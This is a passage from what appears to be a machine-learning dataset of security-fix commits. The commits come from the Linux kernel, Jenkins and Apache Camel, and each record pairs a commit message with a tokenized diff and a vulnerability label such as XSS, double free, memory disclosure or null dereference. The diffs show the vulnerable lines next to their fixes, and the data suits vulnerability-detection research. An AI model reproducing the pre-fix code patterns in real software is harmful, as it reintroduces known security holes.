"read_urb", "-", ">", "context", "=", "port", ";", "spin_lock_init", "(", "&", "priv", "-", ">", "lock", ")", ";"], "docstring_tokens": ["nullpointer", "dereference"]}
{"contents": ["Merge", "pull", "request", "#37", "from", "jenkinsci-cert/SECURITY-214", "[SECURITY-214]", "OfflineCause.toString()", "is", "a", "string,", "not", "necessarily", "HTML"], "code_tokens": ["@", "@", "-", "188", ",", "7", "+", "188", ",", "7", "@", "@", "public", "boolean", "hasTooManyTimeouts", "(", ")", "{", "}", "/", "**", "*", "HTML", "rendering", "of", "the", "data", "*", "String", "rendering", "of", "the", "data", "*", "/", "@", "Override", "public", "String", "toString", "(", ")", "{", "@", "@", "-", "200", ",", "7", "+", "200", ",", "7", "@", "@", "public", "String", "toString", "(", ")", "{", "/", "/", "return", "buf", ".", "toString", "(", ");", "int", "fc", "=", "failureCount", "(", ");", "if", "(", "fc", ">", "0", ")", "return", "Util", ".", "wrapToErrorSpan", "(", "Messages", ".", "ResponseTimeMonitor_TimeOut", "(", "fc", ")", ");", "return", "Messages", ".", "ResponseTimeMonitor_TimeOut", "(", "fc", ")", ";", "return", "getAverage", "(", ")+", "\"", "ms", "\"", ";", "}", "@", "@", "-", "24", ",", "5", "+", "24", ",", "5", "@", "@", "THE", "SOFTWARE", ".", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", ">", "<", "p", "class", "=", "\"", "warning", "\"", "><", "j", ":", "out", "value", "=", "\"$", "{", "it", "}", "\"", "/", "><", "/", "p", ">", "<", "p", "class", "=", "\"", "warning", "\"", ">$", "{", "it", "}", "</", "p", ">", "<", "/", "j", ":", "jelly", ">"], "docstring_tokens": ["cross-site", "scripting", "(xss", ")"]}
{"contents": ["drivers/net/usb/hso.c:", "prevent", "reading", "uninitialized", "memory", "Fixed", "formatting", "(tabs", "and", "line", "breaks).", "The", "TIOCGICOUNT", "device", "ioctl", "allows", "unprivileged", "users", "to", "read", "uninitialized", "stack", "memory,", "because", "the", "\"reserved\"", "member", "of", "the", "serial_icounter_struct", "struct", "declared", "on", "the", "stack", "in", "hso_get_count()", "is", "not", "altered", "or", "zeroed", "before", "being", "copied", "back", "to", "the", "user.", "This", "patch", "takes", "care", "of", "it.", "Signed-off-by:", "Dan", "Rosenberg", "<dan.j.rosenberg@gmail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "1652", ",", "6", "+", "1652", ",", "8", "@", "@", "static", "int", "hso_get_count", "(", "struct", "hso_serial", "*", "serial", ",", "struct", "uart_icount", "cnow", ";", "struct", "hso_tiocmget", "*", "tiocmget", "=", "serial", "-", ">", "tiocmget", ";", "memset", "(", "&", "icount", ",", "0", ",", "sizeof", "(", "struct", "serial_icounter_struct", ")", ");", "if", "(", "!", "tiocmget", ")", "return", "-", "ENOENT", ";", "spin_lock_irq", "(", "&", "serial", "-", ">", "serial_lock", ")", ";"], "docstring_tokens": ["memory", "disclosure"]}
{"contents": ["aio:", "prevent", "double", "free", "in", "ioctx_alloc", "ioctx_alloc()", "calls", "aio_setup_ring()", "to", "allocate", "a", "ring.", "If", "aio_setup_ring()", "fails", "to", "do", "so", "it", "would", "call", "aio_free_ring()", "before", "returning,", "but", "ioctx_alloc()", "would", "call", "aio_free_ring()", "again", "causing", "a", "double", "free", "of", "the", "ring.", "This", "is", "easily", "reproducible", "from", "userspace.", "Signed-off-by:", "Sasha", "Levin", "<sasha.levin@oracle.com>", "Signed-off-by:", "Benjamin", "LaHaise", "<bcrl@kvack.org>"], "code_tokens": ["@", "@", "-", "610", ",", "7", "+", "610", ",", "6", "@", "@", "static", "struct", "kioctx", "*", "ioctx_alloc", "(", "unsigned", "nr_events", ")", "err_cleanup", ":", "aio_nr_sub", "(", "ctx", "-", ">", "max_reqs", ")", ";", "err", ":", "aio_free_ring", "(", "ctx", ")", ";", "free_percpu", "(", "ctx", "-", ">", "cpu", ")", ";", "free_percpu", "(", "ctx", "-", ">", "reqs", ".", "pcpu_count", ")", ";", "free_percpu", "(", "ctx", "-", ">", "users", ".", "pcpu_count", ")", ";"], "docstring_tokens": ["double", "free", "error"]}
{"contents": ["net:", "usb:", "asix:", "fill", "null-ptr-deref", "in", "asix_suspend", "When", "asix_suspend()", "is", "called", "dev->driver_priv", "might", "not", "have", "been", "assigned", "a", "value,", "so", "we", "need", "to", "check", "that", "it's", "not", "NULL.", "Similar", "issue", "is", "present", "in", "asix_resume(),", "this", "patch", "fixes", "it", "as", "well.", "Found", "by", "syzkaller.", "kasan:", "CONFIG_KASAN_INLINE", "enabled", "kasan:", "GPF", "could", "be", "caused", "by", "NULL-ptr", "deref", "or", "user", "memory", "access", "general", "protection", "fault:", "0000", "[#1]", "PREEMPT", "SMP", "KASAN", "Modules", "linked", "in:", "CPU:", "0", "PID:", "24", "Comm:", "kworker/0:1", "Not", "tainted", "4.14.0-rc4-43422-geccacdd69a8c", "#400", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Bochs", "01/01/2011", "Workqueue:", "usb_hub_wq", "hub_event", "task:", "ffff88006bb36300", "task.stack:", "ffff88006bba8000", "RIP:", "0010:asix_suspend+0x76/0xc0", "drivers/net/usb/asix_devices.c:629", "RSP:", "0018:ffff88006bbae718", "EFLAGS:", "00010202", "RAX:", "dffffc0000000000", "RBX:", "ffff880061ba3b80", "RCX:", "1ffff1000c34d644", "RDX:", "0000000000000001", "RSI:", "0000000000000402", "RDI:", "0000000000000008", "RBP:", "ffff88006bbae738", "R08:", "1ffff1000d775cad", "R09:", "0000000000000000", "R10:", "0000000000000000", "R11:", "0000000000000000", "R12:", "ffff8800630a8b40", "R13:", "0000000000000000", "R14:", "0000000000000402", "R15:", "ffff880061ba3b80", "FS:", "0000000000000000(0000)", "GS:ffff88006c600000(0000)", "knlGS:0000000000000000", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "CR2:", "00007ff33cf89000", "CR3:", "0000000061c0a000", "CR4:", "00000000000006f0", "Call", "Trace:", "usb_suspend_interface", "drivers/usb/core/driver.c:1209", "usb_suspend_both+0x27f/0x7e0", "drivers/usb/core/driver.c:1314", "usb_runtime_suspend+0x41/0x120", "drivers/usb/core/driver.c:1852", "__rpm_callback+0x339/0xb60", "drivers/base/power/runtime.c:334", "rpm_callback+0x106/0x220", "drivers/base/power/runtime.c:461", "rpm_suspend+0x465/0x1980", "drivers/base/power/runtime.c:596", "__pm_runtime_suspend+0x11e/0x230", "drivers/base/power/runtime.c:1009", "pm_runtime_put_sync_autosuspend", "./include/linux/pm_runtime.h:251", "usb_new_device+0xa37/0x1020", "drivers/usb/core/hub.c:2487", "hub_port_connect", "drivers/usb/core/hub.c:4903", "hub_port_connect_change", "drivers/usb/core/hub.c:5009", "port_event", "drivers/usb/core/hub.c:5115", "hub_event+0x194d/0x3740", "drivers/usb/core/hub.c:5195", "process_one_work+0xc7f/0x1db0", "kernel/workqueue.c:2119", "worker_thread+0x221/0x1850", "kernel/workqueue.c:2253", "kthread+0x3a1/0x470", "kernel/kthread.c:231", "ret_from_fork+0x2a/0x40", "arch/x86/entry/entry_64.S:431", "Code:", "8d", "7c", "24", "20", "48", "89", "fa", "48", "c1", "ea", "03", "80", "3c", "02", "00", "75", "5b", "48", "b8", "00", "00", "00", "00", "00", "fc", "ff", "df", "4d", "8b", "6c", "24", "20", "49", "8d", "7d", "08", "48", "89", "fa", "48", "c1", "ea", "03", "<80>", "3c", "02", "00", "75", "34", "4d", "8b", "6d", "08", "4d", "85", "ed", "74", "0b", "e8", "26", "2b", "51", "fd", "4c", "RIP:", "asix_suspend+0x76/0xc0", "RSP:", "ffff88006bbae718", "---[", "end", "trace", "dfc4f5649284342c", "]---", "Signed-off-by:", "Andrey", "Konovalov", "<andreyknvl@google.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "626", ",", "7", "+", "626", ",", "7", "@", "@", "static", "int", "asix_suspend", "(", "struct", "usb_interface", "*", "intf", ",", "pm_message_t", "message", ")", "struct", "usbnet", "*", "dev", "=", "usb_get_intfdata", "(", "intf", ")", ";", "struct", "asix_common_private", "*", "priv", "=", "dev", "-", ">", "driver_priv", ";", "if", "(", "priv", "-", ">", "suspend", ")", "if", "(", "priv", "&", "&", "priv", "-", ">", "suspend", ")", "priv", "-", ">", "suspend", "(", "dev", ")", ";", "return", "usbnet_suspend", "(", "intf", ",", "message", ")", ";", "@", "@", "-", "678", ",", "7", "+", "678", ",", "7", "@", "@", "static", "int", "asix_resume", "(", "struct", "usb_interface", "*", "intf", ")", "struct", "usbnet", "*", "dev", "=", "usb_get_intfdata", "(", "intf", ")", ";", "struct", "asix_common_private", "*", "priv", "=", "dev", "-", ">", "driver_priv", ";", "if", "(", "priv", "-", ">", "resume", ")", "if", "(", "priv", "&", "&", "priv", "-", ">", "resume", ")", "priv", "-", ">", "resume", "(", "dev", ")", ";", "return", "usbnet_resume", "(", "intf", ")", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["CAMEL-10575:", "snakeyaml:", "add", "an", "option", "to", "filter", "classes", "the", "yaml", "parser", "can", "construct"], "code_tokens": ["@", "@", "-", "16", ",", "9", "+", "16", ",", "12", "@", "@", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "model", ".", "dataformat", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "List", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlAccessType", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlAccessorType", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlAttribute", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlElement", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlRootElement", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlTransient", ";", "@", "@", "-", "58", ",", "6", "+", "61", ",", "10", "@", "@", "private", "Boolean", "useApplicationContextClassLoader", "=", "true", ";", "@", "XmlAttribute", "@", "Metadata", "(", "defaultValue", "=", "\"", "false", "\"", ")", "private", "Boolean", "prettyFlow", "=", "false", ";", "@", "XmlAttribute", "@", "Metadata", "(", "defaultValue", "=", "\"", "false", "\"", ")", "private", "Boolean", "allowAnyType", "=", "false", ";", "@", "XmlElement", "(", "name", "=", "\"", "typeFilter", "\"", ")", "private", "List", "<", "YAMLTypeFilterDefinition", ">", "typeFilters", ";", "public", "YAMLDataFormat", "(", ")", "{", "this", "(", "YAMLLibrary", ".", "SnakeYAML", ")", ";", "@", "@", "-", "188", ",", "6", "+", "195", ",", "28", "@", "@", "public", "void", "setPrettyFlow", "(", "boolean", "prettyFlow", ")", "{", "this", ".", "prettyFlow", "=", "prettyFlow", ";", "}", "public", "boolean", "isAllowAnyType", "(", ")", "{", "return", "allowAnyType", ";", "}", "/", "**", "*", "Allow", "any", "class", "to", "be", "un", "-", "marshaled", "*", "/", "public", "void", "setAllowAnyType", "(", "boolean", "allowAnyType", ")", "{", "this", ".", "allowAnyType", "=", "allowAnyType", ";", "}", "public", "List", "<", "YAMLTypeFilterDefinition", ">", "getTypeFilters", "(", ")", "{", "return", "typeFilters", ";", "}", "/", "**", "*", "Set", "the", "types", "SnakeYAML", "is", "allowed", "to", "un", "-", "marshall", "*", "/", "public", "void", "setTypeFilters", "(", "List", "<", "YAMLTypeFilterDefinition", ">", "typeFilters", ")", "{", "this", ".", "typeFilters", "=", "typeFilters", ";", "}", "@", "Override", "protected", "DataFormat", "createDataFormat", "(", "RouteContext", "routeContext", ")", "{", "if", "(", "library", "=", "=", "YAMLLibrary", ".", "SnakeYAML", ")", "{", "@", "@", "-", "218", ",", "6", "+", "247", ",", "27", "@", "@", "protected", "void", "configureSnakeDataFormat", "(", "DataFormat", "dataFormat", ",", "CamelContext", "came", "setProperty", "(", "dataFormat", ",", "camelContext", ",", "\"", "classLoader", "\"", ",", "classLoader", ")", ";", "setProperty", "(", "dataFormat", ",", "camelContext", ",", "\"", "useApplicationContextClassLoader", "\"", ",", "useApplicationContextClassLoader", ")", ";", "setProperty", "(", "dataFormat", ",", "camelContext", ",", "\"", "prettyFlow", "\"", ",", "prettyFlow", ")", ";", "setProperty", "(", "dataFormat", ",", "camelContext", ",", "\"", "allowAnyType", "\"", ",", "allowAnyType", ")", ";", "if", "(", "typeFilters", "!", "=", "null", "&", "&", "!", "typeFilters", ".", "isEmpty", "(", "))", "{", "List", "<", "String", ">", "typeFilterDefinitions", "=", "new", "ArrayList", "<", ">(", "typeFilters", ".", "size", "(", "))", ";", "for", "(", "YAMLTypeFilterDefinition", "definition", ":", "typeFilters", ")", "{", "String", "value", "=", "definition", ".", "getValue", "(", ");", "if", "(", "!", "value", ".", "startsWith", "(", "\"", "type", "\"", ")", "&", "&", "!", "value", ".", "startsWith", "(", "\"", "regexp", "\"", "))", "{", "YAMLTypeFilterType", "type", "=", "definition", ".", "getType", "(", ");", "if", "(", "type", "=", "=", "null", ")", "{", "type", "=", "YAMLTypeFilterType", ".", "type", ";", "}", "value", "=", "type", ".", "name", "(", ")", "+", "\"", ":\"", "+", "value", ";", "}", "typeFilterDefinitions", ".", "add", "(", "value", ")", ";", "}", "setProperty", "(", "dataFormat", ",", "camelContext", ",", "\"", "typeFilterDefinitions", "\"", ",", "typeFilterDefinitions", ")", ";", "}", "setPropertyRef", "(", "dataFormat", ",", "camelContext", ",", "\"", "constructor", "\"", ",", "constructor", ")", ";", "setPropertyRef", "(", "dataFormat", ",", "camelContext", ",", "\"", "representer", "\"", ",", "representer", ")", ";", "@", "@", "-", "238", ",", "4", "+", "288", ",", "5", "@", "@", "protected", "void", "setPropertyRef", "(", "DataFormat", "dataFormat", ",", "CamelContext", "camelContext", ",", "setProperty", "(", "camelContext", ",", "dataFormat", ",", "propertyName", ",", "ref", ")", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "47", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "model", ".", "dataformat", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlAccessType", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlAccessorType", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlAttribute", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlRootElement", ";", "@", "XmlRootElement", "(", "name", "=", "\"", "typeFilter", "\"", ")", "@", "XmlAccessorType", "(", "XmlAccessType", ".", "FIELD", ")", "public", "final", "class", "YAMLTypeFilterDefinition", "{", "@", "XmlAttribute", "private", "String", "value", ";", "@", "XmlAttribute", "private", "YAMLTypeFilterType", "type", ";", "public", "String", "getValue", "(", ")", "{", "return", "value", ";", "}", "public", "void", "setValue", "(", "String", "value", ")", "{", "this", ".", "value", "=", "value", ";", "}", "public", "YAMLTypeFilterType", "getType", "(", ")", "{", "return", "type", ";", "}", "public", "void", "setType", "(", "YAMLTypeFilterType", "type", ")", "{", "this", ".", "type", "=", "type", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "26", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "model", ".", "dataformat", ";", "import", "javax", ".", "xml", ".", "bind", ".", "annotation", ".", "XmlEnum", ";", "@", "XmlEnum", "public", "enum", "YAMLTypeFilterType", "{", "type", ",", "regexp", "}", "@", "@", "-", "45", ",", "13", "+", "45", ",", "17", "@", "@", "<", "artifactId", ">", "snakeyaml", "<", "/", "artifactId", ">", "<", "version", ">", "${", "snakeyaml", "-", "version", "}", "</", "version", ">", "<", "/", "dependency", ">", "<", "!-", "-", "testing", "-", "->", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "apache", ".", "camel", "<", "/", "groupId", ">", "<", "artifactId", ">", "camel", "-", "test", "-", "spring", "<", "/", "artifactId", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "apache", ".", "camel", "<", "/", "groupId", ">", "<", "artifactId", ">", "camel", "-", "test", "-", "blueprint", "<", "/", "artifactId", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "apache", ".", "logging", ".", "log4j", "<", "/", "groupId", ">", "<", "artifactId", ">", "log4j", "-", "api", "<", "/", "artifactId", ">", "@", "@", "-", "14", ",", "34", "+", "14", ",", "12", "@", "@", "Every", "library", "requires", "adding", "the", "special", "camel", "component", "(", "see", "\"", "Dependency", ".", "..", "\"", "paragraphs", "further", "down", ")", ".", "By", "default", "Camel", "uses", "the", "SnakeYAML", "library", ".", "[", "[", "YAMLDataFormat", "-", "UsingYAMLdataformatwiththeSnakeYAMLlibrary", "]", "]", "Using", "YAML", "data", "format", "with", "the", "SnakeYAML", "library", "^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "[", "source", ",", "java", "]", "/", "/", "lets", "turn", "Object", "messages", "into", "yaml", "then", "send", "to", "MQSeries", "from", "(", "\"", "activemq", ":", "My", ".", "Queue", "\"", ")", ".", "marshal", "(", ").", "yaml", "(", ")", ".", "to", "(", "\"", "mqseries", ":", "Another", ".", "Queue", "\"", ");", "[", "source", ",", "java", "]", "/", "/", "lets", "turn", "Object", "messages", "into", "yaml", "then", "send", "to", "MQSeries", "from", "(", "\"", "activemq", ":", "My", ".", "Queue", "\"", ")", ".", "marshal", "(", ").", "yaml", "(", "YAMLLibrary", ".", "SnakeYAML", ")", ".", "to", "(", "\"", "mqseries", ":", "Another", ".", "Queue", "\"", ");", "[", "[", "YAML", "-", "Options", "]", "]", "YAML", "Options", "^", "^^", "^^", "^^", "^^", "^^", "^", "/", "/", "dataformat", "options", ":", "START", "The", "YAML", "SnakeYAML", "dataformat", "supports", "8", "options", "which", "are", "listed", "below", ".", "The", "YAML", "SnakeYAML", "dataformat", "supports", "10", "options", "which", "are", "listed", "below", ".", "@", "@", "-", "57", ",", "11", "+", "35", ",", "48", "@", "@", "The", "YAML", "SnakeYAML", "dataformat", "supports", "8", "options", "which", "are", "listed", "below", ".", "|", "resolver", "|", "|", "String", "|", "Resolver", "to", "detect", "implicit", "type", "|", "useApplicationContextClassLoader", "|", "true", "|", "Boolean", "|", "Use", "ApplicationContextClassLoader", "as", "custom", "ClassLoader", "|", "prettyFlow", "|", "false", "|", "Boolean", "|", "Force", "the", "emitter", "to", "produce", "a", "pretty", "YAML", "document", "when", "using", "the", "flow", "style", ".", "|", "allowAnyType", "|", "false", "|", "Boolean", "|", "Allow", "any", "class", "to", "be", "un", "-", "marshaled", "|", "typeFilter", "|", "|", "List", "|", "Set", "the", "types", "SnakeYAML", "is", "allowed", "to", "un", "-", "marshall", "|", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "{", "%", "endraw", "%", "}", "/", "/", "dataformat", "options", ":", "END", "WARNING", ":", "SnakeYAML", "can", "load", "any", "class", "from", "YAML", "definition", "which", "may", "lead", "to", "security", "breach", "so", "by", "default", ",", "SnakeYAML", "DataForma", "restrict", "the", "object", "it", "can", "load", "to", "standard", "Java", "objects", "like", "List", "or", "Long", ".", "If", "you", "want", "to", "load", "custom", "POJOs", "you", "need", "to", "add", "theirs", "type", "to", "SnakeYAML", "DataFormat", "type", "filter", "list", ".", "If", "your", "source", "is", "trusted", ",", "you", "can", "set", "the", "property", "allowAnyType", "to", "true", "so", "SnakeYAML", "DataForma", "won", "'", "t", "perform", "any", "filter", "on", "the", "types", ".", "[", "[", "YAMLDataFormat", "-", "UsingYAMLdataformatwiththeSnakeYAMLlibrary", "]", "]", "Using", "YAML", "data", "format", "with", "the", "SnakeYAML", "library", "^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "-", "Turn", "Object", "messages", "into", "yaml", "then", "send", "to", "MQSeries", "[", "source", ",", "java", "]", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "from", "(", "\"", "activemq", ":", "My", ".", "Queue", "\"", ")", ".", "marshal", "(", ").", "yaml", "(", ")", ".", "to", "(", "\"", "mqseries", ":", "Another", ".", "Queue", "\"", ");", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "[", "source", ",", "java", "]", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "from", "(", "\"", "activemq", ":", "My", ".", "Queue", "\"", ")", ".", "marshal", "(", ").", "yaml", "(", "YAMLLibrary", ".", "SnakeYAML", ")", ".", "to", "(", "\"", "mqseries", ":", "Another", ".", "Queue", "\"", ");", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "-", "Restrict", "classes", "to", "be", "loaded", "from", "YAML", "[", "source", ",", "java", "]", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "/", "/", "Creat", "a", "SnakeYAMLDataFormat", "instance", "SnakeYAMLDataFormat", "yaml", "=", "new", "SnakeYAMLDataFormat", "(", ");", "/", "/", "Restrict", "classes", "to", "be", "loaded", "from", "YAML", "yaml", ".", "addTypeFilters", "(", "TypeFilters", ".", "types", "(", "MyPojo", ".", "class", ",", "MyOtherPojo", ".", "class", ")", ");", "from", "(", "\"", "activemq", ":", "My", ".", "Queue", "\"", ")", ".", "unmarshal", "(", "yaml", ")", ".", "to", "(", "\"", "mqseries", ":", "Another", ".", "Queue", "\"", ");", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "[", "[", "YAMLDataFormat", "-", "UsingYAMLinSpringDSL", "]", "]", "Using", "YAML", "in", "Spring", "DSL", "@", "@", "-", "72", ",", "56", "+", "87", ",", "50", "@", "@", "declare", "the", "data", "formats", "first", ".", "This", "is", "done", "in", "the", "*", "DataFormats", "*", "XML", "tag", ".", "[", "source", ",", "xml", "]", "<", "dataFormats", ">", "<", "!-", "-", "here", "we", "define", "a", "YAML", "data", "format", "with", "the", "id", "snak", "and", "that", "it", "should", "use", "the", "TestPojo", "as", "the", "class", "type", "when", "doing", "unmarshal", ".", "The", "unmarshalTypeName", "is", "optional", ",", "if", "not", "provided", "Camel", "will", "use", "a", "Object", ".", "class", "as", "the", "type", "-", "->", "<", "yaml", "id", "=", "\"", "snake", "\"", "library", "=", "\"", "SnakeYAML", "\"", "unmarshalTypeName", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "yaml", ".", "model", ".", "TestPojo", "\"", "/>", "<", "/", "dataFormats", ">", "And", "then", "you", "can", "refer", "to", "this", "id", "in", "the", "route", ":", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "<", "dataFormats", ">", "<", "!-", "-", "here", "we", "define", "a", "YAML", "data", "format", "with", "the", "id", "snake", "and", "that", "it", "should", "use", "the", "TestPojo", "as", "the", "class", "type", "when", "doing", "unmarshal", ".", "The", "unmarshalTypeName", "is", "optional", "-", "->", "<", "yaml", "id", "=", "\"", "snake", "\"", "library", "=", "\"", "SnakeYAML", "\"", "unmarshalTypeName", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "yaml", ".", "model", ".", "TestPojo", "\"", "/>", "<", "!-", "-", "here", "we", "define", "a", "YAML", "data", "format", "with", "the", "id", "snake", "-", "safe", "which", "restricts", "the", "classes", "to", "be", "loaded", "from", "YAML", "to", "TestPojo", "and", "those", "belonging", "to", "package", "com", ".", "mycompany", "-", "->", "<", "yaml", "id", "=", "\"", "snake", "-", "safe", "\"", ">", "<", "typeFilter", "value", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "yaml", ".", "model", ".", "TestPojo", "\"", "/>", "<", "typeFilter", "value", "=", "\"", "com", ".", "mycompany", "\\", "..", "*\"", "type", "=", "\"", "regexp", "\"", "/>", "<", "/", "yaml", ">", "<", "/", "dataFormats", ">", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "And", "then", "you", "can", "refer", "to", "those", "ids", "in", "the", "route", ":", "[", "source", ",", "xml", "]", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "back", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "snake", "\"", "/>", "<", "to", "uri", "=", "\"", "mock", ":", "reverse", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "unmarshal", "\"", "/>", "<", "unmarshal", ">", "<", "custom", "ref", "=", "\"", "snake", "\"", "/>", "<", "/", "unmarshal", ">", "<", "to", "uri", "=", "\"", "mock", ":", "unmarshal", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "unmarshal", "-", "safe", "\"", "/>", "<", "unmarshal", ">", "<", "custom", "ref", "=", "\"", "snake", "-", "safe", "\"", "/>", "<", "/", "unmarshal", ">", "<", "to", "uri", "=", "\"", "mock", ":", "unmarshal", "-", "safe", "\"", "/>", "<", "/", "route", ">", "[", "[", "YAMLDataFormat", "-", "OptionsforSnakeYAMLDataFormat", "]", "]", "Options", "for", "SnakeYAML", "Data", "Format", "^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "^^", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"<", "25", "%", ",<", "25", "%", ",<", "25", "%", ",<", "25", "%", "\",", "options", "=", "\"", "header", "\"", ",]", "|", "==", "==", "==", "==", "==", "==", 